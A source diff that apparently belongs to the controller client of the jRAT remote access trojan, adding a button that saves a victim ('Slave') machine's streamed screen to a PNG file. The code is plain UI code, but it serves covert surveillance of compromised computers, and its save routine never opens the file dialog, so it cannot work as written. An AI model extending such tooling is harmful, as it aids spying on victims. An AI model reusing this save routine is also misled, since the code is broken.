@@ -1,29 +1,31 @@
 package pro.jrat.client.ui.frames;
 
 import java.awt.BorderLayout;
-import java.awt.Dimension;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.image.BufferedImage;
+import java.io.File;
+import java.io.IOException;
 import java.util.HashMap;
 import java.util.Map;
 
+import javax.imageio.ImageIO;
+import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JCheckBox;
+import javax.swing.JFileChooser;
 import javax.swing.JFrame;
+import javax.swing.JLabel;
 import javax.swing.JProgressBar;
 import javax.swing.JToolBar;
 
+import pro.jrat.client.ErrorDialog;
 import pro.jrat.client.Slave;
 import pro.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import pro.jrat.client.packets.outgoing.Packet26StopRemoteScreen;
 import pro.jrat.client.threads.ThreadFPS;
 import pro.jrat.client.ui.components.JRemoteScreenPane;
-import javax.swing.JLabel;
-import javax.swing.JSeparator;
-import javax.swing.SwingConstants;
-import javax.swing.ImageIcon;
 
 @SuppressWarnings("serial")
 public class FrameRemoteScreen extends BaseFrame {
@@ -114,6 +116,11 @@ public class FrameRemoteScreen extends BaseFrame {
 		toolBarTop.addSeparator();
 		
 		btnCapture = new JButton("");
+		btnCapture.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				capture();
+			}
+		});
 		btnCapture.setToolTipText("Capture");
 		btnCapture.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/camera_black.png")));
 		toolBarTop.add(btnCapture);
@@ -140,6 +147,22 @@ public class FrameRemoteScreen extends BaseFrame {
 		btnStop.setEnabled(false);
 		
 		slave.addToSendQueue(new Packet26StopRemoteScreen());
+	}
+	
+	public void capture() {
+		BufferedImage image = screenPane.getPanel().getImage();
+		
+		JFileChooser c = new JFileChooser();
+		File f = c.getSelectedFile();
+		
+		if (f != null) {
+			try {
+				ImageIO.write(image, "png", f);
+			} catch (Exception e) {
+				ErrorDialog.create(e);
+				e.printStackTrace();
+			}
+		}
 	}
 	
 	public void update(BufferedImage image) {
